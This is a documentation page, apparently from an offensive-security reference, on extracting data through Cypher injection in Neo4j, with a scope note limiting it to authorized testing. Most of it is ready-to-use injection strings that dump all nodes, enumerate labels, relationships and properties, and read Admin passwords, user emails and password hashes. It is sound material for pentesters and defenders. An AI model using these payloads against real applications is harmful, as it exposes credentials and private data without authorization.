---
title: "Data extraction via Cypher injection in Neo4j"
description: "Cross-label extraction through injected UNION, WITH, and MATCH (n) RETURN n clauses, plus schema enumeration with db.labels() and db.schema in Neo4j."
keywords:
  - Neo4j data extraction
  - Cypher UNION injection
  - cross-label extraction
  - db.labels
  - graph schema enumeration
  - property enumeration
---

# Data extraction

A graph has no table boundaries: every node lives in one property graph, so a single injected clause can reach any **label**, **property**, or **relationship** regardless of what the original query selected. Once a Cypher injection point is confirmed (see [Cypher injection](cypher-injection.md)), extraction is a matter of steering the result set to nodes the application never meant to expose.

> **Scope.** For authorized penetration tests, CTF labs, and code review of systems you own or are contracted to assess.

## UNION extraction

`UNION` appends a second query's rows to the first. The column count and names must match the original `RETURN`, so start by matching its shape. If the query returns a single column, return one value per injected row:

```
' RETURN u.name AS x UNION MATCH (a:Admin) RETURN a.password AS x //
' RETURN u.name AS x UNION MATCH (n) RETURN n.secret AS x //
```

Every branch of a `UNION` must return columns with **identical names**, so alias each projection to the same name (`AS x` above) or the query fails to compile. `UNION ALL` keeps duplicates where `UNION` would collapse them.

## Pivoting with WITH and MATCH

Where `UNION` is awkward, close the literal and append your own `MATCH`. `MATCH (n) RETURN n` with no label walks every node in the graph:

```
' WITH 1 AS x MATCH (n) RETURN n //
' WITH 1 AS x MATCH (n) RETURN labels(n), keys(n), properties(n) //
```

`labels(n)` lists a node's labels, `keys(n)` its property names, and `properties(n)` the full property map: three functions that dump structure and contents together without prior knowledge of the schema.

## Enumerating labels, properties, and relationships

Narrow the walk once you know what exists. These built-in procedures expose the schema directly where `CALL` is reachable from the injection point:

```
' CALL db.labels() YIELD label RETURN label //
' CALL db.relationshipTypes() YIELD relationshipType RETURN relationshipType //
' CALL db.propertyKeys() YIELD propertyKey RETURN propertyKey //
```

`db.schema.visualization()` (or the older `db.schema()`) returns the connected label/relationship model in one call:

```
' CALL db.schema.visualization() //
```

With labels in hand, target a specific one and read every property:

```
' WITH 1 AS x MATCH (a:Admin) RETURN a //
' WITH 1 AS x MATCH (u:User) RETURN u.email, u.passwordHash //
```

Relationships expose how nodes connect, often the sensitive part of a graph (who administers what, who can access whom):

```
' WITH 1 AS x MATCH (a)-[r]->(b) RETURN labels(a), type(r), labels(b) //
' WITH 1 AS x MATCH (u:User)-[r:MEMBER_OF]->(g:Group) RETURN u.name, g.name //
```

## Collapsing many rows into one

Where the application reflects only the first row, aggregate the whole result into a single value with `collect()` so one response carries everything:

```
' WITH 1 AS x MATCH (u:User) RETURN collect(u.email) //
' WITH 1 AS x MATCH (n) RETURN collect(DISTINCT labels(n)) //
```

`collect()` builds a list, `reduce()` or string concatenation can flatten it further, and `apoc.convert.toJson()` serializes a node or map into one string field where APOC is present (see [APOC procedure abuse](apoc-procedure-abuse.md)).

When no rows return at all, extraction shifts to [Blind injection](blind-injection.md).

## References

- [Neo4j: Built-in procedures (db.labels, db.schema)](https://neo4j.com/docs/operations-manual/current/reference/procedures/)
- [Neo4j: Cypher UNION](https://neo4j.com/docs/cypher-manual/current/clauses/union/)
- [Neo4j: Functions (labels, keys, properties)](https://neo4j.com/docs/cypher-manual/current/functions/)
